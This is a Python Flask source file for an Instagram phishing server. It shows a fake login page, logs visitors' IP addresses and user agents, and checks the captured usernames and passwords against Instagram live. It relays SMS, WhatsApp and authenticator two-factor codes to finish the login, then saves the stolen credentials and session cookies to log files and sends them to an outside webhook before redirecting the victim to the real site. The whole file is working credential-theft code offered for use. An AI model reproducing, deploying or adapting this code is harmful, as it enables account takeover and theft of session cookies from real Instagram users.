import datetime
import pytz
import logging
from flask import Flask, render_template, request, redirect
from app.instagram_api import IsExists,two_factor
from app.functions import  edit_cookies, first_art, correct_all, wrong_answer, twoFA_active,twoFA_correct, send_webhook_message
from colorama import Fore, Style
import concurrent.futures

app = Flask(__name__)

username = None
password = None
user_agent = None
two_factor_identifier = None
method = None
params = None

@app.route('/')
def index():
    global user_agent,params
    time_zone = "Asia/Baku"  # You can change it
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')

    utc_now = datetime.datetime.now(datetime.timezone.utc)
    baku_tz = pytz.timezone(time_zone)
    baku_now = utc_now.astimezone(baku_tz)
    visit_time = baku_now.strftime("%Y-%m-%d %H:%M:%S")
    
    if user_agent is not None:
        first_art(visit_time, user_ip, user_agent)
        with open('output/ip_agent.log', 'a') as f:
            f.write(f"\n\n\n\nEnter website in: {visit_time} \nIP: {user_ip}\nUser-Agent: {user_agent}\n")
    params = {
                "display_type": "none"
    }
    return render_template('index.html',params=params)




@app.route('/submit', methods=['POST'])
def submit():
    global username, password, user_agent, two_factor_identifier, method,params
    username = request.form['username']
    password = request.form['password']
    user_agent = request.headers.get('User-Agent')
    result, cookies = IsExists(username, password, user_agent)

    if result and result.get("status") == "ok" and result.get("authenticated") is not None and result.get("authenticated"):
        cookies = edit_cookies(cookies)
        correct_all(username, password, cookies)
        with open('output/correct_pass_user.log', 'a') as f:
            f.write(f"\nUsername: {username}\nPassword: {password}\n{cookies}\n")
        message = "Username: " + username + "\nPassword: " + password + "\n\n" + "\t\tCookies\n" + cookies
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(send_webhook_message,  message)
            result = future.result()

        return redirect("https://www.instagram.com")

    elif result.get("two_factor_required"):
        two_factor_identifier = result.get("two_factor_info", {}).get("two_factor_identifier")
        if result.get("two_factor_info", {}).get("sms_two_factor_on"):
            phone_number = result.get("two_factor_info", {}).get("obfuscated_phone_number")
            method = 1
            params = {
                "method_message": f"Enter the code we sent to your number ending in {phone_number}.",
                "backup_message": "If you're unable to receive a security code, use one of your",
                "display_type": "none"
            }
        elif result.get("two_factor_info", {}).get("whatsapp_two_factor_on"):
            method = 2
            params = {
                "method_message": "Enter a login code generated by a whatsapp.",
                "backup_message": "If you're unable to receive a security code, use one of your",
                "display_type": "none"
            }
        elif result.get("two_factor_info", {}).get("totp_two_factor_on"):
            method = 3
            params = {
                "method_message": "Enter a 6-digit login code generated by an authentication app.",
                "backup_message": "If you're unable to receive a login code from an authentication app, you can use one of your",
                "display_type": "none"
            }

        with open('output/correct_pass_user.log', 'a') as f:
            f.write(f"\nUsername: {username}\nPassword: {password}")
        twoFA_active(username,password)
        return redirect("/twoFA")
   
    else:#ERROR 
        wrong_answer(username, password)
        with open('output/wrong_pass.log', 'a') as f:
            f.write(f"\nUsername: {username}\nPassword: {password}\n")
        params = {
                "display_type": "block"
            }
        return render_template('/index.html',params=params)




@app.route('/twoFA', methods=['GET', 'POST'])
def twoFA():
    global username, password, user_agent, two_factor_identifier,method,params

    if request.method == 'POST':
        code = request.form['code']
        result,cookies = two_factor(code,two_factor_identifier,username,user_agent,method)
        
        if result.get("authenticated") is not None and result.get("authenticated"):
            cookies = edit_cookies(cookies)
            message = "Username: " + username + "\nPassword: " + password + "\n\n" + "\t\tCookies\n" + cookies
            twoFA_correct(cookies)
            with open('output/correct_pass_user.log', 'a') as f:
                f.write(f"{cookies}\n")
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.submit(send_webhook_message,  message)
        else:
            params.update({
                "display_type": "block"
            })
            return render_template('/twoFA.html',params=params)
    
    else:
        params.update({
                "display_type": "none"
            })
        return render_template('twoFA.html',params=params)

    return redirect("https://www.instagram.com")


if __name__ == '__main__':
    try:
        log = logging.getLogger('werkzeug')
        log.disabled = True
        logging.disable(logging.CRITICAL)
        host = '0.0.0.0'
        port = 8080
        app.run(host=host, port=port)
    except:
        print(Fore.RED + "EXIT" + Style.RESET_ALL)
